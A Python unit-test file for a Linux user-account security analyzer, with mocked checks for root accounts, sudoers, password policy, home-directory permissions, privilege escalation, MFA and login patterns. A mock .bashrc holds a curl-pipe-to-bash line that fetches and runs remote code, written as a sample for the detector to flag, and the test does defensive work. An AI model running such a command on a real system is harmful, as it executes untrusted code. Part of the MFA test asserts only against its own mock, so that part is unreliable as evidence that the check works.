#!/usr/bin/env python3
"""
Unit tests for the User Account Analyzer module.
"""

import os
import sys
import unittest
from unittest.mock import patch, MagicMock, mock_open
import tempfile
import json
from datetime import datetime, timedelta
import stat

# Add src directory to path for imports
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../../src')))

from modules.user_accounts import UserAccountAnalyzer

class TestUserAccountAnalyzer(unittest.TestCase):
    """Test cases for the User Account Analyzer module"""
    
    def setUp(self):
        """Set up test environment"""
        self.config = {
            'check_sudo': True,
            'check_shell': True,
            'check_auth_logs': True,
            'check_home_security': True,
            'check_password_policy': True,
            'check_group_membership': True,
            'check_privilege_escalation': True,
            'check_mfa_status': True,
            'check_login_patterns': True,
            'expected_sudo_groups': ['sudo', 'wheel', 'admin'],
            'suspicious_ips': ['192.168.1.100']
        }
        
        # Create a temporary directory for baselines
        self.temp_dir = tempfile.TemporaryDirectory()
        self.baseline_file = os.path.join(self.temp_dir.name, 'accounts.json')
        self.config['baseline_file'] = self.baseline_file
        
        # Initialize analyzer
        self.analyzer = UserAccountAnalyzer(self.config)
    
    def tearDown(self):
        """Clean up after tests"""
        self.temp_dir.cleanup()
    
    @patch('subprocess.check_output')
    def test_check_root_accounts(self, mock_subprocess):
        """Test checking for accounts with UID 0"""
        # Setup mock
        mock_subprocess.return_value = "root\n"
        
        # Run test
        result = self.analyzer._check_root_accounts()
        
        # Verify results
        self.assertFalse(result['is_anomalous'])
        self.assertEqual(result['count'], 1)
        self.assertEqual(result['accounts'], ['root'])
        
        # Test with multiple root accounts (anomalous)
        mock_subprocess.return_value = "root\ntoor\n"
        
        # Run test
        result = self.analyzer._check_root_accounts()
        
        # Verify results
        self.assertTrue(result['is_anomalous'])
        self.assertEqual(result['count'], 2)
        self.assertEqual(result['accounts'], ['root', 'toor'])
    
    @patch('subprocess.check_output')
    def test_check_users_with_shell(self, mock_subprocess):
        """Test checking for users with login shells"""
        # Setup mock for normal system
        mock_subprocess.return_value = (
            "root:x:0:0:root:/root:/bin/bash\n"
            "user1:x:1000:1000:User One:/home/user1:/bin/bash\n"
            "user2:x:1001:1001:User Two:/home/user2:/bin/zsh\n"
        )
        
        # Run test
        result = self.analyzer._check_users_with_shell()
        
        # Verify results - should not be anomalous
        self.assertFalse(result['is_anomalous'])
        self.assertEqual(result['count'], 3)
        self.assertEqual(result['suspicious_count'], 0)
        
        # Test with suspicious users (system account with shell)
        mock_subprocess.return_value = (
            "root:x:0:0:root:/root:/bin/bash\n"
            "daemon:x:1:1:daemon:/usr/sbin:/bin/bash\n"
            "user1:x:1000:1000:User One:/home/user1:/bin/bash\n"
        )
        
        # Run test
        result = self.analyzer._check_users_with_shell()
        
        # Verify results - should be anomalous due to daemon having a shell
        self.assertTrue(result['is_anomalous'])
        self.assertEqual(result['count'], 3)
        self.assertEqual(result['suspicious_count'], 1)
        self.assertEqual(result['suspicious_users'][0]['username'], 'daemon')
    
    @patch('os.path.isdir')
    @patch('os.path.isfile')
    @patch('os.listdir')
    @patch('subprocess.check_output')
    def test_check_sudo_users(self, mock_subprocess, mock_listdir, mock_isfile, mock_isdir):
        """Test checking for sudo users"""
        # Setup mocks
        mock_isdir.return_value = True
        mock_isfile.return_value = True
        mock_listdir.return_value = ['custom-sudo']
        
        # First call is for /etc/sudoers, second is for /etc/sudoers.d/custom-sudo
        mock_subprocess.side_effect = [
            "root ALL=(ALL:ALL) ALL\nuser1 ALL=(ALL:ALL) ALL\n",
            "%wheel ALL=(ALL:ALL) ALL\n%custom ALL=(ALL:ALL) ALL\n"
        ]
        
        # Run test
        result = self.analyzer._check_sudo_users()
        
        # Verify results
        self.assertTrue(result['is_anomalous'])
        self.assertEqual(len(result['sudo_users']), 2)
        self.assertEqual(len(result['sudo_groups']), 2)
        self.assertEqual(len(result['unexpected_groups']), 1)
        
        # Verify custom group was detected as unexpected
        self.assertEqual(result['unexpected_groups'][0]['group'], 'custom')
    
    @patch('subprocess.check_output')
    def test_check_suspicious_accounts(self, mock_subprocess):
        """Test checking for suspicious accounts"""
        # Setup mocks for different calls
        
        # First call: check accounts with no password
        # Second call: check hidden users
        # Third call: check UID/GID inconsistency
        mock_subprocess.side_effect = [
            "user1\n",  # No password
            "daemon 1 /usr/sbin/nologin\nhidden 500 /bin/bash\n",  # Hidden user
            "user2 1000 1001\n"  # UID/GID inconsistency
        ]
        
        # Run test
        result = self.analyzer._check_suspicious_accounts()
        
        # Verify results
        self.assertTrue(result['is_anomalous'])
        self.assertEqual(result['total_count'], 3)
        self.assertEqual(result['high_severity_count'], 1)  # No password is high severity
        self.assertEqual(result['medium_severity_count'], 1)  # Hidden user is medium severity
        
        # Verify specific issues
        no_password_found = False
        hidden_user_found = False
        uid_gid_found = False
        
        for account in result['suspicious_accounts']:
            if account.get('reason') == 'No password':
                no_password_found = True
                self.assertEqual(account['username'], 'user1')
                self.assertEqual(account['severity'], 'high')
            elif account.get('reason') == 'Hidden user (UID < 1000)':
                hidden_user_found = True
                self.assertEqual(account['username'], 'hidden')
                self.assertEqual(account['severity'], 'medium')
            elif account.get('reason') == 'UID/GID inconsistency':
                uid_gid_found = True
                self.assertEqual(account['username'], 'user2')
                self.assertEqual(account['severity'], 'low')
        
        self.assertTrue(no_password_found, "Should detect account with no password")
        self.assertTrue(hidden_user_found, "Should detect hidden user")
        self.assertTrue(uid_gid_found, "Should detect UID/GID inconsistency")
    
    @patch('datetime.datetime')
    @patch('subprocess.check_output')
    @patch('os.path.exists')
    def test_check_recent_changes(self, mock_exists, mock_subprocess, mock_datetime):
        """Test checking for recent account changes"""
        # Setup mocks
        mock_exists.return_value = True
        
        # Mock current time
        now = datetime(2023, 1, 1, 12, 0, 0)
        mock_datetime.now.return_value = now
        
        # Mock recent file changes (within 24 hours)
        recent_timestamp = int((now - timedelta(hours=2)).timestamp())
        mock_subprocess.side_effect = [
            f"{recent_timestamp} /etc/passwd\n{recent_timestamp} /etc/shadow\n",  # stat command
            "user1 $hash\n",  # awk command for shadow
            "Last password change               : Dec 31, 2022\n"  # chage command
        ]
        
        # Run test
        result = self.analyzer._check_recent_changes()
        
        # Verify results
        self.assertTrue(result['is_anomalous'])
        self.assertEqual(result['count'], 2)  # Two recent changes
        
        # Verify file changes were detected
        self.assertEqual(result['recent_changes'][0]['file'], '/etc/passwd')
        self.assertEqual(result['recent_changes'][1]['file'], '/etc/shadow')
    
    @patch('subprocess.check_output')
    @patch('os.path.exists')
    def test_check_recent_logins(self, mock_exists, mock_subprocess):
        """Test checking for recent login activity"""
        # Setup mocks
        mock_exists.return_value = True
        
        # Mock outputs
        last_output = (
            "user1   pts/0        192.168.1.100   Sun Jan  1 10:00   still logged in\n"
            "root    pts/1        192.168.1.200   Sun Jan  1 09:00   still logged in\n"
        )
        
        failed_login_output = (
            "Jan  1 08:00:00 host sshd[1234]: Failed password for invalid user admin from 192.168.1.100 port 12345 ssh2\n"
            "Jan  1 08:01:00 host sshd[1235]: Failed password for invalid user admin from 192.168.1.100 port 12346 ssh2\n"
            "Jan  1 08:02:00 host sshd[1236]: Failed password for invalid user admin from 192.168.1.100 port 12347 ssh2\n"
            "Jan  1 08:03:00 host sshd[1237]: Failed password for invalid user admin from 192.168.1.100 port 12348 ssh2\n"
            "Jan  1 08:04:00 host sshd[1238]: Failed password for invalid user admin from 192.168.1.100 port 12349 ssh2\n"
        )
        
        successful_login_output = (
            "Jan  1 09:00:00 host sshd[1240]: Accepted password for root from 192.168.1.200 port 23456 ssh2\n"
            "Jan  1 10:00:00 host sshd[1241]: Accepted password for user1 from 192.168.1.100 port 34567 ssh2\n"
        )
        
        # Set up side effects for different commands
        mock_subprocess.side_effect = [
            last_output,
            failed_login_output,
            successful_login_output
        ]
        
        # Run test
        result = self.analyzer._check_recent_logins()
        
        # Verify results
        self.assertTrue(result['is_anomalous'])
        self.assertEqual(len(result['recent_logins']), 4)  # 2 from last, 2 from auth log
        self.assertEqual(len(result['failed_logins']), 5)
        self.assertEqual(len(result['suspicious_logins']), 1)  # user1 from suspicious IP
        self.assertEqual(len(result['brute_force_attempts']), 1)  # 5+ failed attempts from same IP
    
    @patch('os.walk')
    @patch('os.path.exists')
    @patch('os.stat')
    @patch('builtins.open', new_callable=mock_open)
    def test_check_home_directory_security(self, mock_file, mock_stat, mock_exists, mock_walk):
        """Test checking home directory security"""
        # Setup mocks
        mock_exists.return_value = True
        
        # Mock passwd file content
        passwd_content = (
            "root:x:0:0:root:/root:/bin/bash\n"
            "user1:x:1000:1000:User One:/home/user1:/bin/bash\n"
        )
        
        # Mock file with suspicious content
        rc_file_content = "curl https://example.com/script.sh | bash\n"
        
        # Setup mock_file to return different content based on path
        def mock_file_content(filename, *args, **kwargs):
            if filename == '/etc/passwd':
                return mock_open(read_data=passwd_content).return_value
            elif '/home/user1/.bashrc' in str(filename):
                return mock_open(read_data=rc_file_content).return_value
            return mock_open().return_value
        
        mock_file.side_effect = mock_file_content
        
        # Mock stat results to simulate insecure permissions
        mock_stat_results = {
            '/root': MagicMock(st_mode=0o755, st_uid=0),  # World-readable
            '/home/user1': MagicMock(st_mode=0o700, st_uid=1000),  # Secure
            '/home/user1/.ssh': MagicMock(st_mode=0o777, st_uid=1000),  # Insecure
            '/home/user1/.ssh/id_rsa': MagicMock(st_mode=0o644, st_uid=1000),  # Insecure
            '/home/user1/.bashrc': MagicMock(st_mode=0o644, st_uid=1000)  # Secure
        }
        
        def mock_stat_side_effect(path):
            if path in mock_stat_results:
                return mock_stat_results[path]
            raise FileNotFoundError(f"No mock configured for {path}")
        
        mock_stat.side_effect = mock_stat_side_effect
        
        # Mock walk to return .ssh directory with key files
        mock_walk.return_value = [
            ('/home/user1/.ssh', [], ['id_rsa', 'id_rsa.pub'])
        ]
        
        # Run test
        result = self.analyzer._check_home_directory_security()
        
        # Verify results
        self.assertTrue(result['is_anomalous'])
        self.assertGreater(result['high_severity_count'], 0)
        
        # Verify specific issues
        world_readable_root_found = False
        insecure_ssh_dir_found = False
        insecure_key_found = False
        suspicious_script_found = False
        
        for issue in result['issues']:
            if issue.get('issue') == 'Home directory is world-readable' and issue.get('home_dir') == '/root':
                world_readable_root_found = True
            elif issue.get('issue') == '.ssh directory has insecure permissions':
                insecure_ssh_dir_found = True
            elif issue.get('issue') == 'SSH private key has insecure permissions':
                insecure_key_found = True
            elif 'Suspicious pattern' in issue.get('issue', '') and 'curl' in issue.get('issue', ''):
                suspicious_script_found = True
        
        self.assertTrue(world_readable_root_found, "Should detect world-readable root home directory")
        self.assertTrue(insecure_ssh_dir_found, "Should detect insecure .ssh directory permissions")
        self.assertTrue(insecure_key_found, "Should detect insecure SSH key permissions")
        self.assertTrue(suspicious_script_found, "Should detect suspicious patterns in shell files")
    
    @patch('subprocess.check_output')
    @patch('os.path.exists')
    @patch('builtins.open', new_callable=mock_open)
    def test_check_password_policy(self, mock_file, mock_exists, mock_subprocess):
        """Test checking password policy"""
        # Setup mocks
        mock_exists.return_value = True
        
        # Mock passwd file content
        passwd_content = (
            "root:x:0:0:root:/root:/bin/bash\n"
            "user1:x:1000:1000:User One:/home/user1:/bin/bash\n"
            "user2:x:1001:1001:User Two:/home/user2:/bin/bash\n"
        )
        
        # Mock PAM config missing pam_pwquality
        pam_content_weak = "# Password policy configuration\nauth required pam_unix.so\n"
        
        # Mock PAM config with weak settings
        pam_content_medium = "password required pam_pwquality.so minlen=6\n"
        
        # Mock login.defs with weak settings
        login_defs_content = (
            "# Password aging controls\n"
            "PASS_MAX_DAYS 99999\n"
            "PASS_MIN_DAYS 0\n"
            "PASS_WARN_AGE 2\n"
        )
        
        # Setup mock_file to return different content based on path
        def mock_file_content(filename, *args, **kwargs):
            if filename == '/etc/passwd':
                return mock_open(read_data=passwd_content).return_value
            elif filename == '/etc/pam.d/system-auth':
                return mock_open(read_data=pam_content_medium).return_value
            elif filename == '/etc/pam.d/common-password':
                return mock_open(read_data=pam_content_weak).return_value
            elif filename == '/etc/login.defs':
                return mock_open(read_data=login_defs_content).return_value
            return mock_open().return_value
        
        mock_file.side_effect = mock_file_content
        
        # Mock chage output for password aging
        chage_output_never = "Last password change                                    : never\n"
        chage_output_old = "Last password change                                    : Jan 01, 2022\n"
        
        # Set up side effects for different chage commands
        mock_subprocess.side_effect = [
            chage_output_never,  # root
            chage_output_old,    # user1
            chage_output_never   # user2
        ]
        
        # Run test
        result = self.analyzer._check_password_policy()
        
        # Verify results
        self.assertTrue(result['is_anomalous'])
        self.assertGreater(result['high_severity_count'] + result['medium_severity_count'], 0)
        
        # Verify specific issues
        missing_pwquality_found = False
        weak_minlen_found = False
        max_days_too_high_found = False
        min_days_zero_found = False
        warn_age_too_low_found = False
        old_password_found = False
        
        for issue in result['issues']:
            if issue.get('issue') == 'No strong password policy module configured':
                missing_pwquality_found = True
            elif issue.get('issue') == 'Minimum password length too short':
                weak_minlen_found = True
            elif issue.get('issue') == 'PASS_MAX_DAYS too high':
                max_days_too_high_found = True
            elif issue.get('issue') == 'PASS_MIN_DAYS set to 0':
                min_days_zero_found = True
            elif issue.get('issue') == 'PASS_WARN_AGE too low':
                warn_age_too_low_found = True
            elif issue.get('issue') == 'Password not changed in over a year':
                old_password_found = True
        
        self.assertTrue(missing_pwquality_found, "Should detect missing pwquality module")
        self.assertTrue(weak_minlen_found, "Should detect too short minimum password length")
        self.assertTrue(max_days_too_high_found, "Should detect too high PASS_MAX_DAYS")
        self.assertTrue(min_days_zero_found, "Should detect PASS_MIN_DAYS set to 0")
        self.assertTrue(warn_age_too_low_found, "Should detect too low PASS_WARN_AGE")
        self.assertTrue(old_password_found, "Should detect old passwords not changed in over a year")
    
    @patch('builtins.open', new_callable=mock_open)
    @patch('grp.getgrnam')
    @patch('pwd.getpwnam')
    def test_check_group_membership(self, mock_pwd, mock_grp, mock_file):
        """Test checking group membership"""
        # Setup mocks
        
        # Mock group file content
        group_content = (
            "root:x:0:root\n"
            "sudo:x:27:user1\n"
            "docker:x:999:user2\n"
            "user1:x:1000:user1\n"
            "user2:x:1001:user2\n"
            "unusual.group:x:1002:user2\n"  # Suspicious group name
            ".hidden:x:1003:user1,user2\n"  # Hidden group
        )
        
        # Mock passwd file content
        passwd_content = (
            "root:x:0:0:root:/root:/bin/bash\n"
            "user1:x:1000:1000:User One:/home/user1:/bin/bash\n"
            "user2:x:1001:1001:User Two:/home/user2:/bin/bash\n"
        )
        
        # Setup mock_file to return different content based on path
        def mock_file_content(filename, *args, **kwargs):
            if filename == '/etc/group':
                return mock_open(read_data=group_content).return_value
            elif filename == '/etc/passwd':
                return mock_open(read_data=passwd_content).return_value
            return mock_open().return_value
        
        mock_file.side_effect = mock_file_content
        
        # Mock grp and pwd for user lookups
        mock_grp.side_effect = lambda name: MagicMock(gr_gid=27 if name == 'sudo' else 
                                                           999 if name == 'docker' else 
                                                           1002 if name == 'unusual.group' else 
                                                           1003 if name == '.hidden' else 0)
        
        mock_pwd.side_effect = lambda name: MagicMock(pw_uid=0 if name == 'root' else 
                                                          1000 if name == 'user1' else 
                                                          1001 if name == 'user2' else None)
        
        # Run test
        result = self.analyzer._check_group_membership()
        
        # Verify results
        self.assertTrue(result['is_anomalous'])
        self.assertGreater(result['medium_severity_count'], 0)
        
        # Verify specific issues
        sudo_group_found = False
        docker_group_found = False
        suspicious_group_name_found = False
        hidden_group_found = False
        
        for issue in result['issues']:
            if issue.get('group') == 'sudo' and issue.get('username') == 'user1':
                sudo_group_found = True
                self.assertEqual(issue['severity'], 'medium')
            elif issue.get('group') == 'docker' and issue.get('username') == 'user2':
                docker_group_found = True
                self.assertEqual(issue['severity'], 'medium')
            elif issue.get('group') == 'unusual.group':
                suspicious_group_name_found = True
                self.assertEqual(issue['issue'], 'Suspicious group name')
            elif issue.get('group') == '.hidden':
                hidden_group_found = True
                self.assertEqual(issue['issue'], 'Suspicious group name')
        
        self.assertTrue(sudo_group_found, "Should detect user in sudo group")
        self.assertTrue(docker_group_found, "Should detect user in docker group")
        self.assertTrue(suspicious_group_name_found, "Should detect suspicious group name")
        self.assertTrue(hidden_group_found, "Should detect hidden group")
    
    @patch('subprocess.check_output')
    @patch('os.path.exists')
    @patch('builtins.open', new_callable=mock_open)
    def test_check_privilege_escalation(self, mock_file, mock_exists, mock_subprocess):
        """Test checking privilege escalation vectors"""
        # Setup mocks
        mock_exists.return_value = True
        
        # Mock passwd file content
        passwd_content = (
            "root:x:0:0:root:/root:/bin/bash\n"
            "user1:x:1000:1000:User One:/home/user1:/bin/bash\n"
        )
        
        # Setup mock_file
        mock_file.return_value = mock_open(read_data=passwd_content).return_value
        
        # Mock find output for SUID binary
        suid_output = "-rwsr-xr-x 1 root root 12345 Jan 1 2023 /home/user1/custom-suid\n"
        
        # Mock find output for world-writable files owned by root
        world_writable_output = "-rw-rw-rw- 1 root root 12345 Jan 1 2023 /opt/app/config.json\n"
        
        # Mock getcap output for binaries with capabilities
        getcap_output = "/usr/bin/ping = cap_net_raw+ep\n/home/user1/custom-app = cap_net_admin,cap_sys_admin+ep\n"
        
        # Setup side effects for multiple command calls
        mock_subprocess.side_effect = [
            suid_output,  # SUID binaries in home dir
            # Mock result for _check_sudo_users
            "root ALL=(ALL:ALL) ALL\nuser1 ALL=(ALL:ALL) ALL\n",  # /etc/sudoers
            "%wheel ALL=(ALL:ALL) ALL\n",  # /etc/sudoers.d/custom-sudo
            world_writable_output,  # World-writable files owned by root
            "",  # No world-writable directories found
            "",  # "which getcap" command
            getcap_output  # getcap results
        ]
        
        # Run test
        result = self.analyzer._check_privilege_escalation()
        
        # Verify results
        self.assertTrue(result['is_anomalous'])
        self.assertGreater(result['high_severity_count'], 0)
        
        # Verify specific issues
        suid_binary_found = False
        world_writable_found = False
        dangerous_capabilities_found = False
        
        for issue in result['issues']:
            if issue.get('issue') == 'SUID binary in user home directory':
                suid_binary_found = True
                self.assertEqual(issue['severity'], 'high')
            elif issue.get('issue') == 'World-writable file owned by root':
                world_writable_found = True
                self.assertEqual(issue['severity'], 'high')
            elif issue.get('issue') == 'Binary with capabilities (dangerous)':
                dangerous_capabilities_found = True
                self.assertEqual(issue['severity'], 'high')
                self.assertTrue('cap_sys_admin' in issue.get('capabilities', ''))
        
        self.assertTrue(suid_binary_found, "Should detect SUID binary in home directory")
        self.assertTrue(world_writable_found, "Should detect world-writable file owned by root")
        self.assertTrue(dangerous_capabilities_found, "Should detect dangerous capabilities")
    
    @patch('glob.glob')
    @patch('subprocess.check_output')
    @patch('os.path.exists')
    @patch('builtins.open', new_callable=mock_open)
    def test_check_mfa_status(self, mock_file, mock_exists, mock_subprocess, mock_glob):
        """Test checking MFA status"""
        # Setup mocks
        mock_exists.return_value = True
        
        # Mock passwd file content
        passwd_content = (
            "root:x:0:0:root:/root:/bin/bash\n"
            "user1:x:1000:1000:User One:/home/user1:/bin/bash\n"
            "user2:x:1001:1001:User Two:/home/user2:/bin/bash\n"
        )
        
        # Mock PAM config with no MFA
        pam_content_no_mfa = "auth required pam_unix.so\n"
        
        # Mock PAM config with MFA
        pam_content_with_mfa = "auth required pam_unix.so\nauth required pam_google_authenticator.so\n"
        
        # Setup mock_file to return different content based on path
        def mock_file_content(filename, *args, **kwargs):
            if filename == '/etc/passwd':
                return mock_open(read_data=passwd_content).return_value
            elif filename == '/etc/pam.d/sshd':
                return mock_open(read_data=pam_content_no_mfa).return_value
            return mock_open().return_value
        
        mock_file.side_effect = mock_file_content
        
        # Mock glob to find MFA module
        mock_glob.side_effect = lambda path: ['/usr/lib/security/pam_google_authenticator.so'] if 'pam_google_authenticator' in path else []
        
        # Setup sudo_users mock result
        mock_subprocess.return_value = "root ALL=(ALL:ALL) ALL\nuser1 ALL=(ALL:ALL) ALL\n"
        
        # Run test with no MFA configured in PAM
        result = self.analyzer._check_mfa_status()
        
        # Verify results
        self.assertTrue(result['is_anomalous'])
        
        # Verify specific issues
        module_installed_not_configured_found = False
        
        for issue in result['issues']:
            if issue.get('issue') == 'MFA module installed but not configured in PAM':
                module_installed_not_configured_found = True
                self.assertEqual(issue['severity'], 'medium')
        
        self.assertTrue(module_installed_not_configured_found, "Should detect MFA module installed but not configured")
        
        # Now test with MFA configured but missing for some users
        # Mock PAM config with MFA
        def mock_file_content_with_mfa(filename, *args, **kwargs):
            if filename == '/etc/passwd':
                return mock_open(read_data=passwd_content).return_value
            elif filename == '/etc/pam.d/sshd':
                return mock_open(read_data=pam_content_with_mfa).return_value
            return mock_open().return_value
        
        mock_file.side_effect = mock_file_content_with_mfa
        
        # Mock MFA files for some users but not others
        def mock_exists_selective(path):
            if path == '/home/user1/.google_authenticator':
                return True
            elif path == '/root/.google_authenticator':
                return False
            return True
        
        mock_exists.side_effect = mock_exists_selective
        
        # Update the MFA status in the analyzer (to simulate finding MFA in PAM)
        self.analyzer._check_mfa_status = MagicMock(return_value={
            'is_anomalous': True,
            'issues': [
                {'issue': 'Root user does not have MFA configured', 'severity': 'high'},
                {'issue': 'Sudo user user2 does not have MFA configured', 'severity': 'high'}
            ],
            'high_severity_count': 2,
            'medium_severity_count': 0,
            'total_count': 2,
            'mfa_status': {
                'pam_google_authenticator': True,
                'mfa_configured': True,
                'configured_users': [{'username': 'user1', 'mfa_file': '.google_authenticator'}]
            }
        })
        
        # Run test with MFA configured but missing for some users
        result = self.analyzer._check_mfa_status()
        
        # Verify results
        self.assertTrue(result['is_anomalous'])
        self.assertEqual(result['high_severity_count'], 2)
        
        # Verify specific issues
        root_missing_mfa_found = False
        sudo_user_missing_mfa_found = False
        
        for issue in result['issues']:
            if issue.get('issue') == 'Root user does not have MFA configured':
                root_missing_mfa_found = True
                self.assertEqual(issue['severity'], 'high')
            elif issue.get('issue') == 'Sudo user user2 does not have MFA configured':
                sudo_user_missing_mfa_found = True
                self.assertEqual(issue['severity'], 'high')
        
        self.assertTrue(root_missing_mfa_found, "Should detect root missing MFA")
        self.assertTrue(sudo_user_missing_mfa_found, "Should detect sudo user missing MFA")
    
    @patch('subprocess.check_output')
    def test_check_login_patterns(self, mock_subprocess):
        """Test checking login patterns"""
        # Setup mocks
        
        # Mock last command output
        last_output = (
            "user1   pts/0        192.168.1.100   Sun Jan  1 23:00   still logged in\n"
            "user1   pts/1        192.168.1.101   Sun Jan  1 22:30   still logged in\n"
            "user1   pts/2        192.168.1.102   Sun Jan  1 10:00 - 18:00  (08:00)\n"
            "user2   pts/3        192.168.1.200   Sun Jan  1 09:00   still logged in\n"
            "user3   pts/4        192.168.1.201   Sun Jan  1 10:00 - 17:00  (07:00)\n"
        )
        
        # Mock who command output
        who_output = (
            "user1    pts/0        2023-01-01 23:00 (192.168.1.100)\n"
            "user1    pts/1        2023-01-01 22:30 (192.168.1.101)\n"
            "user2    pts/3        2023-01-01 09:00 (192.168.1.200)\n"
            "user1    pts/5        2023-01-01 20:00 (192.168.1.103)\n"
        )
        
        # Set up side effects for different commands
        mock_subprocess.side_effect = [
            last_output,
            who_output
        ]
        
        # Run test
        result = self.analyzer._check_login_patterns()
        
        # Verify results
        self.assertTrue(result['is_anomalous'])
        
        # Verify specific issues
        unusual_hours_found = False
        multiple_source_ips_found = False
        multiple_sessions_found = False
        
        for issue in result['issues']:
            if 'unusual hours' in issue.get('issue', ''):
                unusual_hours_found = True
                self.assertEqual(issue['username'], 'user1')
                self.assertEqual(issue['severity'], 'medium')
            elif 'multiple source IPs' in issue.get('issue', ''):
                multiple_source_ips_found = True
                self.assertEqual(issue['username'], 'user1')
            elif 'Multiple simultaneous active sessions' in issue.get('issue', ''):
                multiple_sessions_found = True
                self.assertEqual(issue['username'], 'user1')
                self.assertEqual(issue['session_count'], 3)
        
        self.assertTrue(unusual_hours_found, "Should detect logins during unusual hours")
        self.assertTrue(multiple_source_ips_found, "Should detect logins from multiple source IPs")
        self.assertTrue(multiple_sessions_found, "Should detect multiple simultaneous sessions")
    
    @patch('modules.user_accounts.UserAccountAnalyzer._check_threat_intelligence')
    @patch('modules.user_accounts.UserAccountAnalyzer._check_login_patterns')
    @patch('modules.user_accounts.UserAccountAnalyzer._check_mfa_status')
    @patch('modules.user_accounts.UserAccountAnalyzer._check_privilege_escalation')
    @patch('modules.user_accounts.UserAccountAnalyzer._check_group_membership')
    @patch('modules.user_accounts.UserAccountAnalyzer._check_password_policy')
    @patch('modules.user_accounts.UserAccountAnalyzer._check_home_directory_security')
    @patch('modules.user_accounts.UserAccountAnalyzer._check_recent_logins')
    @patch('modules.user_accounts.UserAccountAnalyzer._check_recent_changes')
    @patch('modules.user_accounts.UserAccountAnalyzer._check_suspicious_accounts')
    @patch('modules.user_accounts.UserAccountAnalyzer._check_sudo_users')
    @patch('modules.user_accounts.UserAccountAnalyzer._check_users_with_shell')
    @patch('modules.user_accounts.UserAccountAnalyzer._check_root_accounts')
    def test_analyze_integrates_all_checks(self, mock_root, mock_shell, mock_sudo, 
                                         mock_suspicious, mock_changes, mock_logins,
                                         mock_home, mock_password, mock_group,
                                         mock_privilege, mock_mfa, mock_patterns,
                                         mock_threat):
        """Test that analyze method integrates all checks"""
        # Setup mock returns
        mock_root.return_value = {'is_anomalous': False}
        mock_shell.return_value = {'is_anomalous': False}
        mock_sudo.return_value = {'is_anomalous': False}
        mock_suspicious.return_value = {'is_anomalous': False}
        mock_changes.return_value = {'is_anomalous': False}
        mock_logins.return_value = {'is_anomalous': False}
        mock_home.return_value = {'is_anomalous': True}  # One anomalous result
        mock_password.return_value = {'is_anomalous': False}
        mock_group.return_value = {'is_anomalous': False}
        mock_privilege.return_value = {'is_anomalous': False}
        mock_mfa.return_value = {'is_anomalous': False}
        mock_patterns.return_value = {'is_anomalous': False}
        mock_threat.return_value = {'is_anomalous': False}
        
        # Run test
        result = self.analyzer.analyze()
        
        # Verify results
        self.assertTrue(result['is_anomalous'])  # Should be anomalous due to mock_home
        self.assertEqual(result['home_directory_security'], mock_home.return_value)
        
        # Verify all checks were called
        mock_root.assert_called_once()
        mock_shell.assert_called_once()
        mock_sudo.assert_called_once()
        mock_suspicious.assert_called_once()
        mock_changes.assert_called_once()
        mock_logins.assert_called_once()
        mock_home.assert_called_once()
        mock_password.assert_called_once()
        mock_group.assert_called_once()
        mock_privilege.assert_called_once()
        mock_mfa.assert_called_once()
        mock_patterns.assert_called_once()
        mock_threat.assert_called_once()
        
        # Verify performance metrics are included
        self.assertIn('performance', result)
        self.assertIn('execution_time_seconds', result['performance'])
        self.assertIn('checks_performed', result['performance'])
    
    @patch('os.makedirs')
    @patch('builtins.open', new_callable=mock_open)
    @patch('modules.user_accounts.UserAccountAnalyzer._check_sudo_users')
    @patch('modules.user_accounts.UserAccountAnalyzer._get_all_users')
    def test_establish_baseline(self, mock_get_users, mock_sudo, mock_file, mock_makedirs):
        """Test establishing baseline"""
        # Setup mocks
        mock_get_users.return_value = [
            {'username': 'root', 'uid': 0},
            {'username': 'user1', 'uid': 1000}
        ]
        
        mock_sudo.return_value = {
            'sudo_users': [{'username': 'user1', 'source': '/etc/sudoers'}],
            'sudo_groups': [{'group': 'sudo', 'source': '/etc/sudoers'}]
        }
        
        # Run test
        baseline = self.analyzer.establish_baseline()
        
        # Verify results
        self.assertIsNotNone(baseline)
        self.assertIn('timestamp', baseline)
        self.assertIn('users', baseline)
        self.assertIn('sudo_users', baseline)
        self.assertIn('sudo_groups', baseline)
        
        # Verify content
        self.assertEqual(baseline['users'], mock_get_users.return_value)
        self.assertEqual(baseline['sudo_users'], mock_sudo.return_value['sudo_users'])
        self.assertEqual(baseline['sudo_groups'], mock_sudo.return_value['sudo_groups'])
        
        # Verify directory was created and file was written
        mock_makedirs.assert_called_once()
        mock_file.assert_called_once()
    
    @patch('json.load')
    @patch('os.path.exists')
    @patch('builtins.open', new_callable=mock_open)
    @patch('modules.user_accounts.UserAccountAnalyzer._check_sudo_users')
    @patch('modules.user_accounts.UserAccountAnalyzer._get_all_users')
    def test_compare_baseline(self, mock_get_users, mock_sudo, mock_file, mock_exists, mock_json_load):
        """Test comparing against baseline"""
        # Setup mocks
        mock_exists.return_value = True
        
        # Current state
        mock_get_users.return_value = [
            {'username': 'root', 'uid': 0, 'shell': '/bin/bash'},
            {'username': 'user1', 'uid': 1000, 'shell': '/bin/bash'},
            {'username': 'user3', 'uid': 1002, 'shell': '/bin/bash'}  # New user
        ]
        
        mock_sudo.return_value = {
            'sudo_users': [
                {'username': 'user1', 'source': '/etc/sudoers'},
                {'username': 'user3', 'source': '/etc/sudoers'}  # New sudo user
            ],
            'sudo_groups': [
                {'group': 'sudo', 'source': '/etc/sudoers'},
                {'group': 'custom', 'source': '/etc/sudoers.d/custom'}  # New sudo group
            ]
        }
        
        # Baseline state
        mock_json_load.return_value = {
            'timestamp': '2023-01-01T00:00:00',
            'users': [
                {'username': 'root', 'uid': 0, 'shell': '/bin/bash'},
                {'username': 'user1', 'uid': 1000, 'shell': '/bin/bash'},
                {'username': 'user2', 'uid': 1001, 'shell': '/bin/bash'}  # Removed user
            ],
            'sudo_users': [
                {'username': 'user1', 'source': '/etc/sudoers'}
            ],
            'sudo_groups': [
                {'group': 'sudo', 'source': '/etc/sudoers'}
            ]
        }
        
        # Run test
        result = self.analyzer.compare_baseline()
        
        # Verify results
        self.assertTrue(result['is_anomalous'])
        
        # Verify specific changes
        self.assertEqual(len(result['new_users']), 1)
        self.assertEqual(result['new_users'][0]['username'], 'user3')
        
        self.assertEqual(len(result['removed_users']), 1)
        self.assertEqual(result['removed_users'][0]['username'], 'user2')
        
        self.assertEqual(len(result['new_sudo_users']), 1)
        self.assertEqual(result['new_sudo_users'][0]['username'], 'user3')
        
        self.assertEqual(len(result['new_sudo_groups']), 1)
        self.assertEqual(result['new_sudo_groups'][0]['group'], 'custom')

if __name__ == '__main__':
    unittest.main()